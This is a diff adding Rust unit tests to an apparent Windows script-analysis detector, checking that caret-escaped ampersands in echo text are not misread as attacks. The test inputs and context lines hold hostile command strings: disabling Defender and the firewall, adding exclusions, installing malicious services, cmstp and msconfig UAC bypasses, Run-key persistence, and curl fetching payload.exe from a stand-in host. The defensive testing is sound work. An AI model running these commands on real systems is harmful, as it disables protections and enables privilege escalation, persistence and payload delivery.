@@ -2085,6 +2085,52 @@ move "%cmdDestination%" "%startupFolder%"
     }
 
     #[test]
+    fn escaped_ampersand_defender_registry_text_does_not_emit_evasion() {
+        let script = br#"echo keep ^& reg add HKLM\SYSTEM\CurrentControlSet\Services\WinDefend /v Start /t REG_DWORD /d 4 /f"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            !report.traits.iter().any(|t| matches!(
+                t,
+                Trait::DefenderEvasion { action, target }
+                    if action == "service-start-disabled" && target == "WinDefend"
+            )),
+            "escaped ampersand echo text was misread as Defender service disablement: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn escaped_ampersand_powershell_defender_text_does_not_emit_evasion() {
+        for (script, unexpected_action) in [
+            (
+                br#"echo keep ^& powershell Add-MpPreference -ExclusionPath C:\Users\Public"#
+                    .as_slice(),
+                "exclusion-path",
+            ),
+            (
+                br#"echo keep ^& powershell Set-MpPreference -DisableRealtimeMonitoring $true"#
+                    .as_slice(),
+                "setmp-disablerealtimemonitoring",
+            ),
+            (
+                br#"echo keep ^& netsh advfirewall set allprofiles state off"#.as_slice(),
+                "netsh-fw-off",
+            ),
+        ] {
+            let report = analyze(script, &AnalyzeConfig::default());
+            assert!(
+                !report.traits.iter().any(|t| matches!(
+                    t,
+                    Trait::DefenderEvasion { action, .. } if action == unexpected_action
+                )),
+                "escaped ampersand echo text emitted Defender action {unexpected_action}: {:?}",
+                report.traits
+            );
+        }
+    }
+
+    #[test]
     fn defender_disable_value_classifier_matches_mixed_case_values() {
         assert!(crate::deob_scan::defender_evasion_is_disabling_value(
             "SubmitSamplesConsent",
@@ -13269,6 +13315,38 @@ sc create UpdateSvc binPath= "cmd.exe /c curl -K curl.cfg -o payload.exe""#;
     }
 
     #[test]
+    fn escaped_ampersand_sc_create_text_does_not_emit_service_install() {
+        let script =
+            br#"echo keep ^& sc create BadSvc binPath= C:\Users\Public\bad.exe start= auto"#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            !report.traits.iter().any(|t| matches!(
+                t,
+                Trait::ServiceInstall { service_name, .. } if service_name == "BadSvc"
+            )),
+            "escaped ampersand echo text was misread as service install: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn escaped_ampersand_powershell_new_service_text_does_not_emit_service_install() {
+        let script =
+            br#"echo keep ^& powershell New-Service -Name BadSvc -BinaryPathName C:\Users\Public\bad.exe"#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            !report.traits.iter().any(|t| matches!(
+                t,
+                Trait::ServiceInstall { service_name, .. } if service_name == "BadSvc"
+            )),
+            "escaped ampersand PowerShell New-Service text was misread as service install: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn remote_sc_create_binpath_cmd_child_is_analyzed() {
         let script = br#"sc \\target.example create UpdateSvc binPath= "cmd.exe /V:ON /c set U=https://remote-sc-binpath.example/payload.exe&&curl -o payload.exe !U!""#;
         let report = analyze(script, &Config::default());
@@ -14217,6 +14295,35 @@ mod uac_bypass_tests {
                 .any(|t| matches!(t, Trait::UacBypass { technique } if technique == "cmstp-au")),
             "cmstp /au after other flags was not surfaced in deob text: {:?}",
             env.traits
+        );
+    }
+
+    #[test]
+    fn escaped_ampersand_cmstp_text_does_not_emit_uac_bypass() {
+        let report = crate::analyze(
+            br#"echo keep ^& cmstp.exe /s /au C:\Users\Public\stage.inf"#,
+            &Config::default(),
+        );
+
+        assert!(
+            !report.traits.iter().any(|t| {
+                matches!(t, Trait::UacBypass { technique } if technique == "cmstp-au")
+            }),
+            "escaped echo cmstp text emitted UacBypass: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn escaped_ampersand_msconfig_text_does_not_emit_uac_bypass() {
+        let report = crate::analyze(br#"echo keep ^& msconfig.exe /4"#, &Config::default());
+
+        assert!(
+            !report.traits.iter().any(|t| {
+                matches!(t, Trait::UacBypass { technique } if technique == "msconfig-4")
+            }),
+            "escaped echo msconfig text emitted UacBypass: {:?}",
+            report.traits
         );
     }
 }
@@ -26797,6 +26904,25 @@ powershell -Command "Set-MpPreference -DisableArchiveScanning $true -DisableEmai
                 report.traits
             );
         }
+    }
+
+    #[test]
+    fn escaped_ampersand_powershell_run_key_text_does_not_emit_persistence() {
+        let script = br#"echo keep ^& powershell Set-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Run Updater C:\Users\Public\updater.exe"#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            !report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Persistence { hive, key, value_name, command }
+                    if hive == "HKCU"
+                        && key == r"Software\Microsoft\Windows\CurrentVersion\Run"
+                        && value_name == "Updater"
+                        && command == r"C:\Users\Public\updater.exe"
+            )),
+            "escaped echo PowerShell Run-key text emitted Persistence: {:?}",
+            report.traits
+        );
     }
 
     #[test]
